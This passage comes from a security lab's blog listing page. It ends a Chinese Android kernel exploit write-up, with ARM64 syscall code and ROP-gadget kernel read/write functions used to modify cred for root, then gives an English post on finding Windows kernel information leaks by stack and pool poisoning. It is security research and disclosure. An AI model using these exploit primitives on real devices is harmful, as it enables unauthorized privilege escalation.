<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ioctl_syscall(n, efd, cmd, arg) \</span></span><br><span class="line">        eabi_syscall(n, efd, cmd, arg)</span><br><span class="line">ENTRY(eabi_syscall)</span><br><span class="line">        mov     x8, x0</span><br><span class="line">        mov     x0, x1</span><br><span class="line">        mov     x1, x2</span><br><span class="line">        mov     x2, x3</span><br><span class="line">        mov     x3, x4</span><br><span class="line">        mov     x4, x5</span><br><span class="line">        mov     x5, x6</span><br><span class="line">        svc     #<span class="number">0x0</span></span><br><span class="line">        ret</span><br><span class="line">END(eabi_syscall)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> ＊　rop write</span></span><br><span class="line"><span class="comment"> * ffffffc000671a58:       b9000041        str     w1, [x2]</span></span><br><span class="line"><span class="comment"> * ffffffc000671a5c:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE               0xffffffc000671a58</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_write_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptm_fops + <span class="number">12</span> * <span class="number">8</span>) = ROP_WRITE;</span><br><span class="line"></span><br><span class="line">        arg = addr;</span><br><span class="line">        ioctl_syscall(__NR_ioctl, fake_fd, val, arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理，当我们用 <strong>ROP_READ</strong> 覆盖这个位置时，可以得到一个内核地址写函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * rop read</span></span><br><span class="line"><span class="comment"> * ffffffc000300060:       f9405440        ldr     x0, [x2,#168]</span></span><br><span class="line"><span class="comment"> * ffffffc000300064:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_READ                0xffffffc000300060</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_read_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptm_fops + <span class="number">12</span> * <span class="number">8</span>) = ROP_READ;</span><br><span class="line">        arg = addr - <span class="number">168</span>;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        ret = ioctl_syscall(__NR_ioctl, fake_fd, <span class="number">0xdeadbeef</span>, arg);</span><br><span class="line">        *val = ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，用封装好的内核读写函数，修改内核的 cred 等结构体完成提权。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考 [^]"></a>参考 <a href="#top">[^]</a></h2><p><span id="refer"></span><br><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a></p>
<p><a href="https://github.com/xairy/linux-kernel-exploitation" target="_blank" rel="noopener">xairy</a></p>
<p><a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">New Reliable Android Kernel Root Exploitation Techniques</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/" data-id="cmd5slr1z00070lo114xle397" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/" class="article-date">
  <time datetime="2017-06-14T07:53:40.000Z" itemprop="datePublished">2017-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/">Automatically Discovering Windows Kernel Information Leak Vulnerabilities</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="https://twitter.com/TinySecEx" target="_blank">fanxiaocao(@TinySecEx)</a>  and <a href="http://weibo.com/jfpan" target="_blank">@pjf_</a> of IceSword Lab , Qihoo 360</p>
<hr>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>This Patch-Tuesday MS fixed 6 kernel information leak vulnerabilities reported by us, the details are at the end of this article.<br>I had already show how to fuzz the windows kernel via JS , today we will introduce a new method to discover windows kernel vulnerabilities automatically without fuzzing.<br>I selected a small part from the work in the past few months to spread out this topic.</p>
<h2 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h2><p>In Windows Vista and above, Microsoft enable Kernel Address Space Layout Randomization (KASLR) by default to prevent exploitation by placing various objects at random addresses, rather than fixed ones. It is an effective method against exploitation using Return-oriented Programming (ROP) attack.     </p>
<p>Beginning with Windows 8, KASLR is enhanced with a newly introduced function ExIsRestrictedCaller.<br> Programs under medium integrity are not able to invoke functions such as NtQuerySystemInformation to obtain addresses of kernel modules, kernel objects or pools.      </p>
<p>The functions include but not limited to:</p>
<h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><pre><code>* SystemModuleInformation 
* SystemModuleInformationEx 
* SystemLocksInformation 
* SystemStackTraceInformation 
* SystemHandleInformation 
* SystemExtendedHandleInformation 
* SystemObjectInformation 
* SystemBigPoolInformation 
* SystemSessionBigPoolInformation 
* SystemProcessInformation
* SystemFullProcessInformation</code></pre><h3 id="NtQueryInfomationThread"><a href="#NtQueryInfomationThread" class="headerlink" title="NtQueryInfomationThread"></a>NtQueryInfomationThread</h3><h3 id="NtQueryInfomationProcess"><a href="#NtQueryInfomationProcess" class="headerlink" title="NtQueryInfomationProcess"></a>NtQueryInfomationProcess</h3><p>The above is the traditional way to get the kernel module address and kernel object address, as the kernel normal feature.<br>But after win8, low integrity application will fail in calling these functions.     </p>
<p>In order to bypass KASLR, a direct countermeasure is to discover vulnerabilities that leak valuable information from the kernel mode to calculate the address of kernel module or kernel object.     </p>
<h2 id="Kernel-Information-Leak"><a href="#Kernel-Information-Leak" class="headerlink" title="Kernel Information Leak"></a>Kernel Information Leak</h2><p>As a kind of kernel vulnerability, it has its own uniqueness. For example, for the traditional memory damage vulnerabilities, the vulnerability itself will affect the running of the kernel. With the help of verifier and other tools, you can easily capture this exception among the normal traffic.<br>But the kernel information leak vulnerability does not trigger any exception, nor does it affect the running of the kernel, which makes it more difficult to be discovered.<br>Vulnerabilities objectively exist, what we need to do is to find them at lowest cost.      </p>
<h2 id="Discover-ideas"><a href="#Discover-ideas" class="headerlink" title="Discover ideas"></a>Discover ideas</h2><p>When kernel information leak vulnerability occurs, the kernel will certainly write some valuable data to the user buffer.<br>So if we monitor all the writing behaviors to user buffer in the kernel, we will be able to find them.      </p>
<p>Of course, the system does not provide this feature.<br>I capture the process with the help of a hardware virtualization based framework of pjf,<br>who is the author of the famous windows kernel anti-rootkit tool named iceSword. </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/DigTool.png" alt>            </p>
<p>In order not to affect the dest system itself, I monitored in the VMWARE guest and write some log files, and then further analyze them in the host system.  </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/loader.png" alt>     </p>
<p>In the host machine, after decoding and analyzing the logs:  </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/analyze.png" alt>    </p>
<p>Then we have the human-readable logs: </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/log.png" alt>       </p>
<h2 id="Further-Analysis"><a href="#Further-Analysis" class="headerlink" title="Further Analysis"></a>Further Analysis</h2><p>Now we have operation records in user memory buffer written by kernel.<br>Most of them are just normal functions.     </p>
<p>We need remove nosiy data to find out the key information.<br>Two skills are needed.     </p>
<h3 id="Poison-the-kernel-stack"><a href="#Poison-the-kernel-stack" class="headerlink" title="Poison the kernel stack"></a>Poison the kernel stack</h3><p>Poisoning or polluting the target is a common idea.<br>At network penetration testing, there are also ARP and DNS cache poisoning.       </p>
<p>Here is the kernel stack poisoning, refers to the pollution to the entire unused kernel stack space.     </p>
<p>If a variable on a kernel stack is not initialized, then when this variable is written to the user buffer, there will be a magic value in the record written by me. Wherever these is a magic value, there is a leak.        </p>
<p>I noticed that j00ru also used similar techniques in his BochsPwn project.        </p>
<h4 id="KiFastCallEntry-Hook"><a href="#KiFastCallEntry-Hook" class="headerlink" title="KiFastCallEntry Hook"></a>KiFastCallEntry Hook</h4><p>In order to poison the kernel stack, I hooked nt!KiFastCallEntry.<br>So that when a syscall invoked, I can poisoning the entire unused kernel stack space.  </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/KiFastCallEntryHook.png" alt>      </p>
<p>Firstly, I used ** IoGetStackLimits ** to get the current thread stack range, and then from the bottom of the stack to the current stack location of the entire space are filled with 0xAA.     </p>
<p>So when I entered the syscall, all the contents of the local variables on the kernel stack will be filled into 0xAA.       </p>
<h3 id="Poison-the-kernel-pool"><a href="#Poison-the-kernel-pool" class="headerlink" title="Poison the kernel pool"></a>Poison the kernel pool</h3><p>Similarly, for dynamically allocated memory, I used hook <strong>nt!ExAllocatePoolWithTag</strong> and so on, and polluted its POOL content.</p>
<p>If the kernel stack/heap variable is not properly initialized, it is possible to write this magic value to the user buffer.   </p>
<p>With the help of the logs we captured, we can immediately find this vulnerability.<br>In order to remove the coincidence, I also used a number of magic value such as <strong>0xAAAAAAAA</strong> , <strong>0xBBBBBBB</strong> to exclude false positives.       </p>
<p>A typical result after excluding the interference is as follows.    </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/magic.png" alt>      </p>
<p>You can see that in a short monitoring process, it caught the ** 161 ** leaks in the system!<br>Of course, this is not exhaustive. There are not so many independent vulnerabilities, but some vulnerabilities made repeated leaks.       </p>
<p>At this point we caught a real information leak vulnerability, there is stack information, supplemented by a simple manual analysis, we can got the details.<br>This is also the story behind the <strong>CVE-2017-8482</strong>.     </p>
<h3 id="Difference-comparison"><a href="#Difference-comparison" class="headerlink" title="Difference comparison"></a>Difference comparison</h3><p>For the kernel information leak caused by the uninitialized stack, we can poison them at first and then find them.<br>But for the direct disclosure of key information, such as the module and the object address written directly, it cannot be found in this way.      </p>
<p>In the process of the system running, the kernel itself will frequently write data to the user buffer, a lot of data is in the kernel address range, but in fact it is not a valid address, but a noise data.<br>There are many such noise data, such as strings, pixels, rect, region, etc. which are likely happen to be a kernel address. We need to rule out the noise and found a real leak.      </p>
<p>Here we filter out some meaningful addresses, such as:     </p>
<ol>
<li>Module address, must be inside in the system module list     </li>
<li>object address    </li>
<li>POOL address   </li>
</ol>
<p>After the environment changes, such as restarting the system,  it must be able to leak the same type of data at the same location.     </p>
<p>After the exclusion of the normal function of the system, such as <strong>NtQuerySystemInformation</strong> and similar functions, the left data’s credibility is very high.    </p>
<h3 id="The-leak-of-module-address"><a href="#The-leak-of-module-address" class="headerlink" title="The leak of module address"></a>The leak of module address</h3><p>For example <strong>CVE-2017-8485</strong>   </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/diff.png" alt>    </p>
<p>You can see that the results at this time is very obvious - the same stack, the same location, are leaked <strong>nt! ObpReferenceObjectByHandleWithTag + 0x19f</strong>    </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/vul1_detail.png" alt>    </p>
<h3 id="The-leak-of-object-address"><a href="#The-leak-of-object-address" class="headerlink" title="The leak of object address"></a>The leak of object address</h3><p>Due to leakage of object address and POOL address not fixed by Microsoft this month, I cannot describe the details.  </p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/object.png" alt>    </p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>You can see that we do not need a fuzzer, only through the code coverage generated by normal running of the system itself, we found these vulnerabilities.<br>Any normal program running can improve this coverage.<br>In fact, in the actual work, I only use the game and the browser to improve coverage and got good results.<br>A game finished, ten kernel vulnerabilities on the hand.</p>
<p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/game.jpg" alt>     </p>
<h2 id="The-case-of-this-month"><a href="#The-case-of-this-month" class="headerlink" title="The case of this month"></a>The case of this month</h2><h3 id="CVE-2017-8470"><a href="#CVE-2017-8470" class="headerlink" title="CVE-2017-8470"></a>CVE-2017-8470</h3><p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/CVE-2017-8470.png" alt>   </p>
<h3 id="CVE-2017-8474"><a href="#CVE-2017-8474" class="headerlink" title="CVE-2017-8474"></a>CVE-2017-8474</h3><p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/CVE-2017-8474.png" alt>   </p>
<h3 id="CVE-2017-8476"><a href="#CVE-2017-8476" class="headerlink" title="CVE-2017-8476"></a>CVE-2017-8476</h3><p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/CVE-2017-8476.png" alt>    </p>
<h3 id="CVE-2017-8482"><a href="#CVE-2017-8482" class="headerlink" title="CVE-2017-8482"></a>CVE-2017-8482</h3><p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/CVE-2017-8482.png" alt>    </p>
<h3 id="CVE-2017-8485"><a href="#CVE-2017-8485" class="headerlink" title="CVE-2017-8485"></a>CVE-2017-8485</h3><p><img src="/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/CVE-2017-8485.png" alt>    </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/" data-id="cmd5slr2000080lo13i5r45th" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="../../">&amp;laquo; Prev</a><a class="page-number" href="../../">1</a><span class="page-number current">2</span><a class="page-number" href="../3/">3</a><a class="extend next" rel="next" href="../3/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../../2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="../../2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="../../2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
            <a href="../../2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="../../2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../archives" class="mobile-nav-link">Archives</a>
  
    <a href="../../research" class="mobile-nav-link">Research</a>
  
    <a href="../../vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="../../recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="../../about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../../fancybox/jquery.fancybox.css">

  
<script src="../../fancybox/jquery.fancybox.pack.js"></script>




<script src="../../js/script.js"></script>




  </div>
</body>
</html>